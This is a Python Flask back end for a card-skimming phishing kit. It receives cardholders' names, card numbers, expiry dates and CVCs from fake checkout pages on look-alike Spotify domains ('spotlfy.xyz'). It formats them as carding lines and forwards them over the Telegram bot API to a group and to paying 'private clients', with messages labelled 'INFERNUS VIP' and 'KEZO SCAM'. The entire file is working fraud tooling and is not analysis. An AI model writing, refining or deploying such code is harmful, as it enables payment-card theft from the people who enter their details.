import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN CARGADA DE .env ---
with open('.env', 'r') as f:
    for line in f:
        if '=' in line and not line.strip().startswith('#'):
            key, value = line.strip().split('=', 1)
            globals()[key] = value

TELEGRAM_BOT_TOKEN = TELEGRAM_BOT_TOKEN
DOMINIOS_CONFIG = {
    'free.spotlfy.xyz': {'id_grupo_destino': ID_GRUPO_FREE, 'clientes_privados': CLIENTES_FREE},
    'gratis.spotlfy.xyz': {'id_grupo_destino': ID_GRUPO_GRATIS, 'clientes_privados': CLIENTES_GRATIS}
}

# --- TEST PARA VERIFICAR CONEXIÓN TELEGRAM ---
@app.route('/test', methods=['GET'])
def test_bot():
    MI_ID_PARA_TEST = ID_PRINCIPAL
    url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": MI_ID_PARA_TEST,
        "text": "🚀 *BOT ACTIVO - FREE DOMAIN* 🚀\nTodo funciona correctamente.",
        "parse_mode": "Markdown"
    }
    
    try:
        res = requests.post(url_telegram, json=payload, timeout=5)
        if res.status_code == 200:
            return jsonify({"status": "ok", "msg": "Mensaje enviado - FREE DOMAIN"}), 200
        else:
            return jsonify({"status": "error", "msg": res.text}), 500
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

# --- ENDPOINT PARA RECIBIR DATOS DEL CHECKOUT ---
@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    lista_ids_html = data.get('lista_ids', [])
    origen = request.headers.get('Origin', '').split('/')[2]

    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A').replace(' ', '')  # Quita espacios
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # Separar mes y año
    exp_parts = expiracion.split('/')
    if len(exp_parts) == 2:
        mes = exp_parts[0]
        ano = exp_parts[1]
    else:
        mes = expiracion
        ano = 'N/A'

    # Formato de una línea: NUMERO|MES|AÑO|CVC
    cc_linea = f"{tarjeta}|{mes}|{ano}|{cvc}"
    
    # Determinar dominio del checkout y configuración correspondiente
    config = DOMINIOS_CONFIG.get(origen, {'id_grupo_destino': ID_GRUPO_FREE, 'clientes_privados': CLIENTES_FREE})
    id_grupo_destino = config['id_grupo_destino']
    lista_maestra_strings = [str(i).strip() for i in config['clientes_privados'] + [ID_PRINCIPAL]]
    
    mensaje = (
        f"🔥 *INFERNUS VIP - {origen}* 🔥\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"`{cc_linea}`\n\n"
        f"👤 _{nombre}_"
    )

    # Enviar al grupo de Telegram correspondiente al dominio
    url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    try:
        res = requests.post(url_telegram, json={"chat_id": id_grupo_destino, "text": mensaje, "parse_mode": "Markdown"}, timeout=5)
        if res.status_code == 200:
            print(f"✅ ENVIADO AL GRUPO DE {origen}")
            return jsonify({"status": "success", "enviados": 1}), 200
    except Exception as e:
        print(f"❌ ERROR: {e}")

    # Enviar a los clientes privados del dominio correspondiente (excepto al grupo)
    exitos = 0
    lista_maestra_strings_clientes = [str(i).strip() for i in config['clientes_privados']]
    
    for id_receptor in lista_ids_html:
        id_limpio = str(id_receptor).strip()
        
        if id_limpio in lista_maestra_strings_clientes and id_limpio != ID_PRINCIPAL:
            url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            
            try:
                # Mensaje personalizado para cada cliente privado
                mensaje_personalizado = (
                    f"🔥 *KEZO SCAM}* 🔥\n"
                    f"━━━━━━━━━━━━━━━━━━\n\n"
                    f"`{cc_linea}`\n\n"
                    f"👤 _{nombre}_"
                )
                
                res = requests.post(url_telegram, json={"chat_id": id_limpio, "text": mensaje_personalizado, "parse_mode": "Markdown"}, timeout=5)
                if res.status_code == 200:
                    exitos += 1
                    print(f"✅ ENVIADO A CLIENTE DE {origen}: {id_limpio}")
                else:
                    print(f"❌ ERROR TELEGRAM: {res.text}")
            except Exception as e:
                print(f"❌ ERROR RED: {e}")

    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

